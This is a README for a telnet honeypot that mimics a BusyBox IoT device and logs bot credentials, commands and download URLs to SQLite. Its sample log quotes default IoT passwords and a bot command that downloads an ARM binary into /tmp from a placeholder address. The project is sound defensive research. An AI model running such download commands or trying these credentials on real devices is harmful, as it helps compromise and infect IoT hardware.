# honeypot

A telnet honeypot: a fake BusyBox IoT device that lets bots log in and records what they try (credentials, commands, download URLs, the bytes they `echo` into files). It makes a good stress test for the runtime, since everything about its input is hostile.

## Run it

```sh
build/gem examples/honeypot/main.gem                     # 127.0.0.1:2323, data in ./honeypot_data
build/gem examples/honeypot/main.gem --port 2323 --bind 0.0.0.0 --data DIR --keep-weeks 8
build/gem examples/honeypot/main.gem --log               # also print each event on stdout
build/gem examples/honeypot/test.gem                     # the tests (part of make test)
```

```sh
telnet 127.0.0.1 2323        # or nc 127.0.0.1 2323, which skips negotiation as most bots do
```

Each limit under [Limits](#limits) that has a flag takes a positive int: `--max-sessions`, `--max-per-ip`, `--max-session-ms`, `--max-bytes`, `--max-logins`, `--max-commands`, `--max-backlog` and `--idle-ms`. There are also `--accept-on` (which login attempt succeeds), `--metrics-ms` (how often metrics are sampled), `--keep-weeks`, and `--commit ID`, which is stored in each metrics row to name the build. `--help` lists every flag.

## Data

Events go to a SQLite database, one file per week in the data directory (`honeypot-YYYY-MM-DD.db`, named after the week's Monday, UTC). The data directory is created if missing, but its parent must exist. Files older than the newest `--keep-weeks` are deleted when the recorder starts and when it first writes in a new week. Read them with the `sqlite3` shell:

```sh
sqlite3 honeypot_data/honeypot-*.db \
  "SELECT username, password, count(*) FROM logins GROUP BY 1, 2 ORDER BY 3 DESC LIMIT 20"
```

Every stored string comes from an attacker, so escape it before showing it in a terminal or a browser.

With `--log`, every event except the raw input is also printed as a line on stdout, with bytes outside printable ASCII written as `\xHH`. A session is named by its pid:

```
2026-10-10T09:34:31Z session=6 session_start ip="127.0.0.1" port=63532
2026-10-10T09:34:31Z session=6 login user="root" password="xc3511" ok=false
2026-10-10T09:34:31Z session=6 login user="root" password="vizxv" ok=true
2026-10-10T09:34:31Z session=6 command line="cd /tmp; wget http://1.2.3.4/x.arm7; echo -e \"\\x45LF\""
2026-10-10T09:34:31Z session=6 url url="http://1.2.3.4/x.arm7" via="wget"
2026-10-10T09:34:31Z session=6 echo bytes="ELF"
2026-10-10T09:34:31Z session=6 command line="exit"
2026-10-10T09:34:31Z session=6 session_end reason="exit" bytes_in=100 bytes_out=403 logged_in=true ms=1
```

| Event | Fields | Stored in |
|---|---|---|
| `session_start` | `ip`, `port` | a `sessions` row |
| `input` | `bytes`: a chunk as read, up to 64 KB per session | `input` (BLOB) |
| `login` | `user`, `password`, `ok` | `logins` |
| `command` | `line`, as typed | `commands` |
| `url` | `url`, `via` (`wget`, `curl`, `tftp`, `ftpget`) | `urls` |
| `echo` | `bytes`: what an `echo -e` decoded | `echoes` (BLOB) |
| `cap` | `cap`: a limit was hit (see Limits), with `ip` for a refused connection and `detail` for a failed spawn or the recorder's dropped events | `cap_events` |
| `error` | `reason`, `trace`, and the session's counts; a `crash` follows | the trace with the crash, the counts in the `sessions` row |
| `session_end` | `reason` (`closed`, `idle`, `exit`, `write_failed`, or the cap that ended it), `bytes_in`, `bytes_out`, `logged_in`, `ms` | ends the `sessions` row |
| `crash` | `reason`: the session exited abnormally | `crashes`; ends the row as `crash` |
| `metrics` | at startup, then every minute | `metrics` |

If a session's end never reaches the recorder (because the recorder or the registry restarted), the row is ended within two minutes of the session's death: as `crash` if its `error` event arrived, otherwise as `lost`. A session that is live when a new week starts has its row in the old file ended as `week_end` and gets a new row in the new file. On startup the recorder ends any rows a previous run left open as `lost`. The schema is `SCHEMA` in `recorder.gem`, and times are epoch milliseconds.

A `metrics` row holds:

| Column | What it holds |
|---|---|
| `uptime_ms` | time since the program started (a drop means a restart) |
| `rss_kb` | resident memory from `/proc/self/status`; empty where that doesn't exist (macOS) |
| `fds` | open file descriptors |
| `procs`, `memory` | live processes and the bytes their arenas hold (`runtime_stats()`) |
| `resources_open`, `resources_ownerless` | open sockets and database handles, and those with no owner (the listener is one) |
| `sessions`, `session_ips` | live sessions and the IPs they come from |
| `reset_ms`, `resets_over_10ms`, `resets_over_100ms` | time spent in arena resets since the previous sample, and how many resets took that long |
| `spawn_refused` | failed spawns since the previous sample |
| `backlog`, `events_dropped` | messages waiting for the recorder, and events it dropped since its previous metrics row |
| `gem_commit` | the `--commit` given |

## Design

```
honeypot_sup (supervisor, one_for_one)
├── recorder            stores the events in SQLite
├── front (supervisor, one_for_all)
│   ├── registry        spawns and monitors the sessions
│   │                   └── one session per connection
│   └── acceptor        tcp_accept loop
└── sampler             records the metrics
```

| File | What it holds |
|---|---|
| `main.gem` | entry point: flags, listen, start |
| `server.gem` | the supervision tree and the accept loop |
| `registry.gem` | starts a session per connection within the caps, reports crashes |
| `session.gem` | one connection: reads, echo, writes, timeouts |
| `telnet.gem` | strips telnet commands from the input, answers negotiation |
| `lines.gem` | splits the input into lines |
| `shell.gem` | the fake login and shell, as a state machine that does no I/O |
| `device.gem` | the fake device's canned text |
| `recorder.gem` | the database (schema, batched writes, weekly files, the backlog cap) and the log lines |
| `sampler.gem` | the metrics |
| `test.gem` | unit tests and end-to-end tests over TCP |

Nothing is ever run or fetched. `wget`, `curl`, `tftp` and `ftpget` record the URL, `wget` and `curl` print fake progress, and running a downloaded file prints nothing. The device claims to be 32-bit ARM: `uname -m` says `armv7l`, and `cat` of `/proc/self/exe`, `/bin/busybox`, `/bin/sh` or `/bin/echo` prints an ARM ELF header and program headers. `shell.line` takes a line and returns the text to send and the events, so the tests drive the shell without sockets.

The server offers `WILL ECHO` and `WILL SUPPRESS-GO-AHEAD`, accepts the client's SUPPRESS-GO-AHEAD, refuses every other option, and answers each request at most once, so a client that keeps asking can't make it loop. It echoes only for a client that accepted the echo, and line by line, so a password that arrives in the same packet as the username isn't echoed.

A session sends its raw input to the recorder before handling it, so the bytes that crash a session are stored. It runs under one `pcall` only to send the error's trace to the recorder, then raises the same error again, so it still crashes and its `DOWN` carries the reason. A killed session has no trace.

The recorder is the only process that touches SQLite, whose queries run on the scheduler thread. It writes the events in one transaction every second or every 200 events, so a crash of the whole program loses about the last second of events.

Each session claims its socket, so the socket is closed however the session ends. The registry claims it first. A socket still waiting in the registry's mailbox belongs to the acceptor, which is why the registry and the acceptor restart together.

## Limits

Each limit is an option of `server.start`. Hitting one that isn't a timeout records a `cap` event.

| Limit | Default | When it is hit |
|---|---|---|
| `max_sessions`, `max_per_ip` | 1000, 16 | a new connection is closed at once |
| `idle_ms` | 60 s | a silent client is disconnected (`idle`) |
| `write_ms` | 5 s | a client that doesn't read is disconnected (`write_failed`) |
| `max_session_ms` | 10 min | the session ends (`max_time`) |
| `max_bytes` | 1 MB | the session ends once the client has sent more (`max_bytes`) |
| `max_logins` | 10 | the session ends after that many failed logins (`max_logins`) |
| `max_commands` | 500 | the session ends after that many command lines (`max_commands`) |
| `max_line`, `max_subneg` | 4 KB, 1 KB | the line is dropped, or the subnegotiation abandoned and the rest read as data; the session goes on |
| `max_input` | 64 KB | the rest of the session's input isn't stored |
| `max_backlog` | 10,000 | the recorder drops everything except session starts and ends and metrics, until fewer than half as many messages wait |

A connection flood from one address is refused at the per-IP cap, but each refusal is still a row, and under a flood big enough to back up the recorder those rows are among the events it drops.

## Testing

`test.gem` covers the telnet parser, the line splitter, the shell, the recorder (backlog cap included) and the sampler, and drives the server over TCP: the caps, crashes and their data, and restarts of the registry and the recorder. `TARGETS=honeypot benchmarks/soak/run.sh` runs an hour of hostile clients against it and checks the database afterwards (see `benchmarks/README.md`).

## Known limits

- Only the first 64 KB of a session's input are stored, so a crash after that keeps the start of the input, not the bytes that caused it.
- Command parsing is rough. Globs are kept as typed. `$NAME`, `${NAME}`, `$?` and `$$` expand as each command runs, but `${NAME:-word}` and the like stay as typed, and positional parameters are empty. A command substitution runs when its command does, and its output isn't split into words. A `(...)` group runs as a subshell; `{ ...; }` groups aren't parsed. In a pipeline, filters like `grep` and `head` pass their input through unchanged.
